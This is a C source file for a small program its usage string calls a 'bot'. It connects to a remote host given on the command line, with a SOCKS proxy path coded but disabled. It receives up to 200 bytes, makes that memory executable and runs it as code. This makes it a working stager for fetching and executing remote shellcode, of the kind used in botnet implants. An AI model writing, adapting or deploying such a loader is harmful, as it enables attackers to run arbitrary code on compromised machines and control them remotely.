#include "socks.h"
#include "utils.h"

int main(int argc, char **argv)
{
	if (argc != 5)
	{
		printf("Usage: bot <proxy_host> <proxy_port> <remote_host> <remote_port>\n");
		return -1;
	}

	uint8_t *proxy_host = argv[1];
	uint8_t *proxy_port = argv[2];
	uint8_t *remote_host = argv[3];
	uint8_t *remote_port = argv[4];

	unsigned char payload[200] = { 0x90 };

	int number_of_read_bytes = 0;
	int s;

	if (false)
	{
		/* 
			-------- With proxy -------- 
		*/
		s = open_socket_via_socks(proxy_host, proxy_port, remote_host, remote_port);
		if (s < 0) 
		{
			printf("error in create socks socket.\n");
			return -1;
		}
	}
	else
	{
		/* 
			-------- Without proxy -------- 
		*/
		struct sockaddr_in remote = { 0 };

		s = socket(AF_INET, SOCK_STREAM, 0);
		if (0 > s) return -1;

		convert_to_sockaddr(remote_host, remote_port, &remote);
		
		if (connect(s, (struct sockaddr *)&remote, sizeof(remote))) return -1;
	}

	if ((number_of_read_bytes = recv(s, payload, sizeof(payload), 0)) < 0) return -1;

	change_page_permissions_of_address(payload, PROT_READ | PROT_WRITE | PROT_EXEC);

	void (*func)() = (void (*)(void *)) payload;
	func();

	change_page_permissions_of_address(payload, PROT_READ | PROT_WRITE);

	close(s);

	return 0;
}